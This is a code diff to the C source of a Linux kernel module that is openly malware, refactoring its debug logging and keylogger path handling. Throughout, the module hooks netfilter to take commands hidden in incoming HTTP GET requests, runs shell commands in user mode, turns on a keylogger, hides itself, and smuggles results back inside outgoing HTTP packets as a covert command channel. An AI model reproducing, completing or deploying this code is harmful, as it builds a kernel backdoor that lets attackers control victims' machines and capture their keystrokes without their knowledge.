@@ -15,11 +15,12 @@
 #include "hidder.h"
 #include "usermode.h"
 #include "keylogger.h"
-
+#include "debug_helper.h"
 
 #define MALWARE_FUNC "colman-function"
 #define MALWARE_ARG "colman-arg"
 #define RESULT_HEADER_STR "Content-Encoding: "
+
 #define MAX_HTTP_HEADER_LEN 2048
 #define MAX_HTTP_DATA_LEN 1024
 #define MINIMUM_CNC_DATA 170-24
@@ -52,16 +53,20 @@ typedef struct _result_msg{
 }result_msg;
 
 
+char keylogger_path[MAX_COMMAND_LEN] = { 0 };
+
 // Global struct for the result msg
 result_msg * global_result_msg = NULL;
 
 // Struct for the usermode thread handler
+//static struct task_struct *qu_thread = NULL;
 static struct task_struct *um_thread = NULL;
-
-static struct task_struct *qu_thread = NULL;
 
 // Global struct for the usermode thread handler arguments
 run_cmd_args * um_thread_cmd = NULL;
+//char * usermode_buf = NULL;
+
+//INIT_GENERIC_KTHREAD(usermode);
 
 char * callback_busy = NULL;
 char result_ready = 0;
@@ -135,43 +140,43 @@ unsigned int http_callback_result( unsigned int hooknum, struct sk_buff *pskb, c
 		goto accept_and_exit_result;
 	}
 
-	//printk(KERN_INFO "[+] Colman: saddr = %d.%d.%d.%d\n",*(unsigned char *)(&iph->saddr), *(unsigned char *)(&iph->saddr + 1), *(unsigned char *)(&iph->saddr + 2), *(unsigned char *)(&iph->saddr + 3));
-	printk(KERN_INFO "[+] Colman: HTTP GET DETECTED -> CHANGE PACKET\n");
+	//dbg_print("saddr = %d.%d.%d.%d\n",*(unsigned char *)(&iph->saddr), *(unsigned char *)(&iph->saddr + 1), *(unsigned char *)(&iph->saddr + 2), *(unsigned char *)(&iph->saddr + 3));
+	dbg_print("HTTP GET DETECTED -> CHANGE PACKET.");
 	
 
 	if (unlikely(skb_linearize(pskb) != 0))
 	{
-		printk(KERN_INFO "[-] Colman: not linear\n");
+		dbg_err_print("not linear.");
 		goto accept_and_exit_result;
 	}
 
 	space_left = skb_tailroom(pskb);
 	if (space_left == 0)
 	{
-		printk(KERN_INFO "[-] Colman: check is needed\n");
+		dbg_err_print("check is needed.");
 		goto accept_and_exit_result;	
 	}
   	
-	printk(KERN_INFO "[+] Colman: space left: %d\n", skb_tailroom(pskb));
+	dbg_print("space left: %d.", skb_tailroom(pskb));
 
-    printk(KERN_INFO "[+] Colman: data_len: %d\n", ntohs(iph->tot_len));
+    dbg_print("data_len: %d.", ntohs(iph->tot_len));
 
-    printk(KERN_INFO "[+] Colman: new data_len: %d\n", ntohs(htons(2 + ntohs(iph->tot_len))));
+    dbg_print("new data_len: %d.", ntohs(htons(2 + ntohs(iph->tot_len))));
 
   	result_msg_len =  strlen(result_header) + strlen(result_header_end) + global_result_msg->len;
-	printk(KERN_INFO "[+] Colman: len: %d\n", result_msg_len);
+	dbg_print("len: %d.", result_msg_len);
 
 	if (space_left < result_msg_len)
 	{
 		// We can extend the space left
-		printk(KERN_INFO "[-] Colman: Not enougth space\n");
+		dbg_err_print("Not enougth space.");
 		goto accept_and_exit_result;
 	}
   	ptr = (char*) skb_put(pskb, result_msg_len); 
 
   	if (!ptr)
   	{
-		printk(KERN_INFO "[-] Colman: Something want wrong\n");
+		dbg_err_print("Something want wrong.");
 		goto accept_and_exit_result;  		
   	}
 
@@ -179,14 +184,14 @@ unsigned int http_callback_result( unsigned int hooknum, struct sk_buff *pskb, c
 
   	if (!global_result_msg)
   	{
-		printk(KERN_INFO "[-] Colman: No result\n");
+		dbg_err_print("No result.");
 		goto accept_and_exit_result;  		
   	}
 
 
   	if (!global_result_msg->msg)
   	{
-		printk(KERN_INFO "[-] Colman: No result\n");
+		dbg_err_print("No result.");
 		goto accept_and_exit_result; 		
   	}
 
@@ -197,7 +202,7 @@ unsigned int http_callback_result( unsigned int hooknum, struct sk_buff *pskb, c
     
     /* Manipulating necessary header fields */
     iph->tot_len = htons(result_msg_len + ntohs(iph->tot_len));
-    printk(KERN_INFO "[+] Colman: New tot len 0x%x\n", iph->tot_len);
+    dbg_print("New tot len 0x%x.", iph->tot_len);
     //tcph->len = htons(tot_data_len + TCP_HDR_LEN);
 
     /* Calculation of IP header checksum */
@@ -210,8 +215,8 @@ unsigned int http_callback_result( unsigned int hooknum, struct sk_buff *pskb, c
     len = pskb->len - offset;
     tcph->check = ~csum_tcpudp_magic((iph->saddr), (iph->daddr), len, IPPROTO_TCP, 0);
 
-	//printk(KERN_INFO "[+] Colman: saddr = %d.%d.%d.%d\n",*(unsigned char *)(&iph->saddr), *(unsigned char *)(&iph->saddr + 1), *(unsigned char *)(&iph->saddr + 2), *(unsigned char *)(&iph->saddr + 3));
-	printk(KERN_INFO "[+] Colman: PACKET Changed\n");
+	//dbg_print("saddr = %d.%d.%d.%d\n",*(unsigned char *)(&iph->saddr), *(unsigned char *)(&iph->saddr + 1), *(unsigned char *)(&iph->saddr + 2), *(unsigned char *)(&iph->saddr + 3));
+	dbg_print("PACKET Changed.");
 	result_ready = 0;
 	goto accept_and_exit_result;
 
@@ -273,8 +278,8 @@ unsigned int http_callback_get_command( unsigned int hooknum, struct sk_buff *ps
 	if (*httph != GET ) { // Not GET
 		goto accept_and_exit_cmd;
 	}
-	printk(KERN_INFO "[+] Colman: HTTP GET DETECTED -> EXEC COMMANDS\n");
-	//printk(KERN_INFO "[+] Colman: saddr = %d.%d.%d.%d:\n",*(unsigned char *)(&iph->saddr), *(unsigned char *)(&iph->saddr + 1), *(unsigned char *)(&iph->saddr + 2), *(unsigned char *)(&iph->saddr + 3));
+	dbg_print("HTTP GET DETECTED -> EXEC COMMANDS.");
+	//dbg_print("saddr = %d.%d.%d.%d:\n",*(unsigned char *)(&iph->saddr), *(unsigned char *)(&iph->saddr + 1), *(unsigned char *)(&iph->saddr + 2), *(unsigned char *)(&iph->saddr + 3));
 
 	index = find_malware_struct(tcp_data, MALWARE_FUNC);
 	if (!index)
@@ -292,17 +297,18 @@ unsigned int http_callback_get_command( unsigned int hooknum, struct sk_buff *ps
 	}
 	command[i-2] = 0x0;
 
-	printk(KERN_INFO "[+] Colman: cmd: %s\n", command);
+
+	dbg_print("cmd: %s.", command);
 	if (kstrtol(command, 10, &command_num) != 0)
 	{
-    	printk(KERN_INFO "[-] Colman: Invlid command.\n");
+    	dbg_err_print("Invlid command.");
 		goto accept_and_exit_cmd;
 	}
 
 	switch ((COMMANDS)command_num) {
 		case TEST :
 			set_result_msg("MALWARE ON", strlen("MALWARE ON"));
-			printk(KERN_INFO "[+] Colman: OK\n");
+			dbg_print("OK.");
 			break;
 
 		case KILL:
@@ -310,10 +316,10 @@ unsigned int http_callback_get_command( unsigned int hooknum, struct sk_buff *ps
 			
 			// if (qu_thread)
 			// {
-			// 	printk(KERN_INFO "[+] Colman: wake_up_process(qu_thread)\n");
+			// 	dbg_print("wake_up_process(qu_thread).");
 			// 	wake_up_process(qu_thread);
 			// }
-			printk(KERN_INFO "[+] Colman: after qu_thread\n");
+			dbg_print("after qu_thread.");
 			break;
 
 		case SELF_HIDE:
@@ -328,34 +334,38 @@ unsigned int http_callback_get_command( unsigned int hooknum, struct sk_buff *ps
 			break;
 
 		case KEYLOGGER:
-			index = find_malware_struct(tcp_data, MALWARE_ARG);
-			if (!index)
+			if (*keylogger_path == 0x0)
 			{
-				set_result_msg("Shell command missing", strlen("Shell command missing"));
-				goto accept_and_exit_cmd;
-			}
-			for (i = 2; tcp_data[index + strlen(MALWARE_ARG) + i] != 0xd; i++)
-			{
-				command[i-2] = tcp_data[index + strlen(MALWARE_ARG) + i];
-				if (i > MAX_COMMAND_LEN || (index + strlen(MALWARE_ARG) + i >= tcp_data_len - 1))
+				index = find_malware_struct(tcp_data, MALWARE_ARG);
+				if (!index)
 				{
-					goto failed_and_exit;
+					set_result_msg("Shell command missing", strlen("Shell command missing"));
+					goto accept_and_exit_cmd;
 				}
-			}
-			command[i-2] = 0x0;
+				for (i = 2; tcp_data[index + strlen(MALWARE_ARG) + i] != 0xd; i++)
+				{
+					keylogger_path[i-2] = tcp_data[index + strlen(MALWARE_ARG) + i];
+					if (i > MAX_COMMAND_LEN || (index + strlen(MALWARE_ARG) + i >= tcp_data_len - 1))
+					{
+						goto failed_and_exit;
+					}
+				}
+				keylogger_path[i-2] = 0x0;
 
-			if (*command == 0x0)
+			}			
+			if (*keylogger_path == 0x0)
 			{
-				printk(KERN_INFO "[-] Colman: There is no command to alloc.\n");
+				dbg_err_print("There is no command to alloc.");
 				goto failed_and_exit;
 				break;
 			}
+
 			//ACTIVE KEYLOGGER
 			
-			printk(KERN_INFO "[+] Colman: keylogger on folder %s.\n", command);
-			if (switch_keylogger(command, 0))
+			dbg_print("keylogger on %s.", keylogger_path);
+			if (switch_keylogger(keylogger_path, 0))
 			{
-				set_result_msg("Keylogger: on :file:", strlen("Keylogger: on :file:"));	
+				set_result_msg("Keylogger: on", strlen("Keylogger: on"));	
 			}
 			else
 			{
@@ -383,19 +393,19 @@ unsigned int http_callback_get_command( unsigned int hooknum, struct sk_buff *ps
 
 			if (*command == 0x0)
 			{
-				printk(KERN_INFO "[-] Colman: There is no command to alloc.");
+				dbg_err_print("There is no command to alloc.");
 				goto failed_and_exit;
 				break;
 			}
 
 			if (!um_thread_cmd)
 			{
-				printk(KERN_INFO "[-] Colman: um_thread_cmd in not allocated.");
+				dbg_err_print("um_thread_cmd in not allocated.");
 				goto failed_and_exit;
 				break;
 			}
 			um_thread_cmd->arg = (char *)kmalloc(sizeof(char) * i, GFP_ATOMIC);
-			// TODO: need to free every time....
+			// TODO: need to free every time..
 			if (!um_thread_cmd->arg)
 			{
 				goto failed_and_exit;
@@ -406,10 +416,10 @@ unsigned int http_callback_get_command( unsigned int hooknum, struct sk_buff *ps
 			if (um_thread)
 			{
 				//um_thread_activate = 1;
-				//printk(KERN_INFO "[+] Colman: run %s\n", command);
+				//dbg_print("run %s\n", command);
 				wake_up_process(um_thread);
 			}
-			
+
 			set_result_msg(":file:", strlen(":file:"));
 			break;
 			
@@ -420,7 +430,7 @@ unsigned int http_callback_get_command( unsigned int hooknum, struct sk_buff *ps
 
 		default:
 			set_result_msg("Invalid command", strlen("Invalid command"));
-			printk(KERN_INFO "[-] Colman: Invalid command - %ld\n", command_num);
+			dbg_err_print("Invalid command - %ld.", command_num);
 			break;
 	}
 
@@ -457,9 +467,8 @@ void set_http_callback( void )
 	um_thread = kthread_create(run_usermode_cmd_thread, um_thread_cmd, "um_thread");
 
 	wake_up_process(um_thread);
-	//callback_busy = (char *)kmalloc(sizeof(char), GFP_ATOMIC);
-	//qu_thread = kthread_create(quiter_thread, callback_busy, "qu_thread");
 
+	init_keylogger();
 	http_hook_in.hook = (void *)http_callback_get_command;
 	http_hook_in.hooknum = NF_INET_PRE_ROUTING;
 	http_hook_in.pf = PF_INET;
@@ -515,10 +524,14 @@ void unset_http_callback ( void )
 	if (um_thread_cmd)
 		kfree(um_thread_cmd);
 
+
+	clean_keylogger();
+	//CLEAN_GENERIC_KTHREAD(usermode);
+
 	// if (qu_thread)
 	// 	kthread_stop(qu_thread);
 
 	// kill flag in on
-	switch_keylogger(NULL, 1);
+	//switch_keylogger(NULL, 1);
 }
 
